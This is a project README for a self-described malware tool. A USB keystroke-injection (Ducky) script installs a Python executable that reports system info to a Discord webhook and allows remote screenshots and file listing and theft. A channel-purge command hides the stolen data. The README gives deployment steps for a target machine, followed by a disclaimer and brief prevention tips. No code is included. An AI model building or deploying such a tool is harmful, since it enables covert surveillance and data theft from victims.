## Discord Backend
This repo includes a hackDucky script that installs a Python executable which sends system info to a Discord webhook on startup.
The file also allows the user to control the computer remotely. They can take screenshot (!screenshot), kill the program (!kill), view and take files (!list_files <path>, !get_file <path>)
and clear the channel to hide sensitive info during testing (!purge_channel).

## Setup
1. Update the download link in the Ducky script to point to your Python executable.
2. Copy the updated Ducky script to your HackDucky SD card.
3. Create a `.env` file in the same folder as your Python script with the following content
    ```
    URL="your_discord_webhook_url_here"
    ```
4. Add your bot token to the .env or hardcode it in (for exe EXPOSES TOKEN)
5. Run or deploy the Python executable on the target machine.
6. When the executable runs, it will collect system information and send it to the Discord webhook URL defined in `.env`.

# VERY IMPORTANT

This code is clearly **malware**.

**DO NOT USE IT AS MALWARE.**

This code is intended **only for testing and learning purposes**.

If you install or run this on someone else’s machine **without their permission, you may have committed a felony.**

**PLEASE** use it responsibly and ethically.

[More info - Please read](CODE_OF_CONDUCT.md)
---

## How to prevent.

While Windows Defender will block programs similar to this in many cases.
**PLEASE** keep your computers safe. If you see any USBs that are not yours REMOVE THEM.
Be careful of public computers (free public libraries, makerspaces, etc.) as they can be easily
infected with keyloggers etc. In general avoid any sus :amoug_us: links.

(if this is used as malware I will commit war crimes so like dont plz)